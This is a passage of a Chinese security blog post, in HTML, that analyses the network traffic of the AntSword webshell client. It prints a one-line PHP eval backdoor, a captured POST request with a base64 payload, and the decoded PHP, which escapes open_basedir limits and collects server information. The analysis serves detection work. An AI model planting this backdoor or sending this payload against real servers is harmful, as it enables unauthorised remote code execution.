@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+	<meta name="referrer" content="no-referrer">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="常见Webshell连接工具流量分析蚁剑网站后门一句话1&lt;?php eval($_POST[&amp;#x27;bckdor&amp;#x27;]);?&gt;  wireshark抓包 连接过程分析 http request数据包 123456789POST &#x2F;ma.php HTTP&#x2F;1.1Host: localhostAccept-Encoding: gzip, deflateUser-Agent: M">
+<meta property="og:type" content="article">
+<meta property="og:title" content="常见Webshell连接工具流量分析">
+<meta property="og:url" content="http://example.com/2022/09/08/%E5%86%B0%E8%9D%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="s1eep123のblog">
+<meta property="og:description" content="常见Webshell连接工具流量分析蚁剑网站后门一句话1&lt;?php eval($_POST[&amp;#x27;bckdor&amp;#x27;]);?&gt;  wireshark抓包 连接过程分析 http request数据包 123456789POST &#x2F;ma.php HTTP&#x2F;1.1Host: localhostAccept-Encoding: gzip, deflateUser-Agent: M">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220908111858077.png">
+<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220908151648206.png">
+<meta property="og:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220908154800432.png">
+<meta property="article:published_time" content="2022-09-08T09:47:19.000Z">
+<meta property="article:modified_time" content="2022-09-08T09:48:27.258Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="攻防">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220908111858077.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>常见Webshell连接工具流量分析 · s1eep123&#39;s blog</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="s1eep123のblog" type="application/atom+xml">
+</head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>s1eep123's blog.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">s1eep123&#39;s blog.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">常见Webshell连接工具流量分析</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:30vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                常见Webshell连接工具流量分析
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        
+        
+            
+        
+            
+        
+        
+        <span class="post-category" data-categories="红蓝攻防/web安全"">
+            <i class="fas fa-folder post-category-icon"></i>
+            <span class="post-category-text">
+                红蓝攻防/web安全
+            </span>
+        </span>
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="攻防">攻防</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="web安全">web安全</a>
+    
+</div>
+
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.9k</span>Reading time: <span class="post-count reading-time">15 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/09/08</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="常见Webshell连接工具流量分析"><a href="#常见Webshell连接工具流量分析" class="headerlink" title="常见Webshell连接工具流量分析"></a>常见Webshell连接工具流量分析</h2><h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><h6 id="网站后门一句话"><a href="#网站后门一句话" class="headerlink" title="网站后门一句话"></a>网站后门一句话</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;bckdor&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h6 id="wireshark抓包"><a href="#wireshark抓包" class="headerlink" title="wireshark抓包"></a>wireshark抓包</h6><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220908111858077.png" alt="image-20220908111858077"></p>
+<h6 id="连接过程分析"><a href="#连接过程分析" class="headerlink" title="连接过程分析"></a>连接过程分析</h6><ol>
+<li><p>http request数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /ma.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1643</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">bckdor=%40eval(%40base64_decode(%24_POST%5B&#x27;e435b616de0459&#x27;%5D))%3B&amp;e435b616de0459=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjE1MzA5NTg5MWJkZCI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiBAYmFzZTY0X2VuY29kZSgkb3V0KTt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICI1NTFhIi4iYzc1ODAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImY1NSIuIjJiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk%2FQHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk%2FJHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7</span><br></pre></td></tr></table></figure>
+
+<p>url解码后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bckdor=@eval(@base64_decode($_POST[&#x27;e435b616de0459&#x27;]));&amp;e435b616de0459=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLjE1MzA5NTg5MWJkZCI7QG1rZGlyKCR0bWRpcik7aWYoIUBmaWxlX2V4aXN0cygkdG1kaXIpKXtjb250aW51ZTt9QGNoZGlyKCR0bWRpcik7QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsICIuLiIpOyRjbnRhcnI9QHByZWdfc3BsaXQoIi9cXFxcfFwvLyIsJHRtZGlyKTtmb3IoJGk9MDskaTxzaXplb2YoJGNudGFycik7JGkrKyl7QGNoZGlyKCIuLiIpO307QGluaV9zZXQoIm9wZW5fYmFzZWRpciIsIi8iKTtAcm1kaXIoJHRtZGlyKTticmVhazt9O307O2Z1bmN0aW9uIGFzZW5jKCRvdXQpe3JldHVybiBAYmFzZTY0X2VuY29kZSgkb3V0KTt9O2Z1bmN0aW9uIGFzb3V0cHV0KCl7JG91dHB1dD1vYl9nZXRfY29udGVudHMoKTtvYl9lbmRfY2xlYW4oKTtlY2hvICI1NTFhIi4iYzc1ODAiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gImY1NSIuIjJiZSI7fW9iX3N0YXJ0KCk7dHJ5eyREPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTtpZigkRD09IiIpJEQ9ZGlybmFtZSgkX1NFUlZFUlsiUEFUSF9UUkFOU0xBVEVEIl0pOyRSPSJ7JER9CSI7aWYoc3Vic3RyKCRELDAsMSkhPSIvIil7Zm9yZWFjaChyYW5nZSgiQyIsIloiKWFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9ZWxzZXskUi49Ii8iO30kUi49IgkiOyR1PShmdW5jdGlvbl9leGlzdHMoInBvc2l4X2dldGVnaWQiKSk/QHBvc2l4X2dldHB3dWlkKEBwb3NpeF9nZXRldWlkKCkpOiIiOyRzPSgkdSk/JHVbIm5hbWUiXTpAZ2V0X2N1cnJlbnRfdXNlcigpOyRSLj1waHBfdW5hbWUoKTskUi49Igl7JHN9IjtlY2hvICRSOzt9Y2F0Y2goRXhjZXB0aW9uICRlKXtlY2hvICJFUlJPUjovLyIuJGUtPmdldE1lc3NhZ2UoKTt9O2Fzb3V0cHV0KCk7ZGllKCk7</span><br></pre></td></tr></table></figure>
+
+<p>解码base部分+代码格式化+分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">@</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$opdir</span> = @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;open_basedir&quot;</span>);  <span class="comment">//获取用户可访问服务器的目录</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$opdir</span>) &#123;</span><br><span class="line">    <span class="variable">$ocwd</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">//当前文件在服务器的绝对路径，后获取目录部分</span></span><br><span class="line">    <span class="variable">$oparr</span> = <span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/;|:/&quot;</span>, <span class="variable">$opdir</span>);</span><br><span class="line">    @<span class="title function_ invoke__">array_push</span>(<span class="variable">$oparr</span>, <span class="variable">$ocwd</span>, <span class="title function_ invoke__">sys_get_temp_dir</span>()); <span class="comment">//</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;  <span class="comment">//遍历用户可访问服务器的目录，当前文件绝对目录，临时文件目录</span></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable">$tmdir</span> = <span class="variable">$item</span>.<span class="string">&quot;/.153095891bdd&quot;</span>;</span><br><span class="line">        @<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>); <span class="comment">//创建临时目录153095891bdd</span></span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        @<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>); <span class="comment">//改变目录到153095891bdd</span></span><br><span class="line">        @<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>); <span class="comment">//将153095891bdd添加到可访问服务器的目录</span></span><br><span class="line">        <span class="variable">$cntarr</span> = @<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>, <span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>); <span class="variable">$i</span>++) &#123;@</span><br><span class="line">            <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">        &#125;;@</span><br><span class="line">        <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;/&quot;</span>);@</span><br><span class="line">        <span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span>@ <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$out</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;551a&quot;</span>.</span><br><span class="line">    <span class="string">&quot;c7580&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span>@ <span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;f55&quot;</span>.</span><br><span class="line">    <span class="string">&quot;2be&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$D</span> == <span class="string">&quot;&quot;</span>) <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);</span><br><span class="line">    <span class="variable">$R</span> = <span class="string">&quot;<span class="subst">&#123;$D&#125;</span>	&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$D</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="title function_ invoke__">range</span>(<span class="string">&quot;C&quot;</span>, <span class="string">&quot;Z&quot;</span>) <span 